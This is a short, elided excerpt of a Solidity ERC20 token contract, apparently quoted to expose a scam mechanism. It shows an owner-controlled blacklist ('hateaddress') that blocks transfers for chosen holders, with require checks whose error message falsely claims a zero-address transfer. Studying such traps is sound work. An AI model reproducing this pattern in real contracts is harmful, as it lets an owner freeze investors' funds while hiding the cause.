...
contract luna is ERC20, Ownable, BaseToken {
    ...
    mapping(address => bool) private ishateaddress;
    ...
    function hateaddress(
        address[] calldata accounts,
        bool excluded
    ) public onlyOwner {
        for (uint256 i = 0; i < accounts.length; i++) {
            ishateaddress[accounts[i]] = excluded;
        }
    }
    ...
    function _transfer(
        ...
        require(!ishateaddress[from], "ERC20: transfer to the zero address");
        require(!ishateaddress[to], "ERC20: transfer to the zero address");
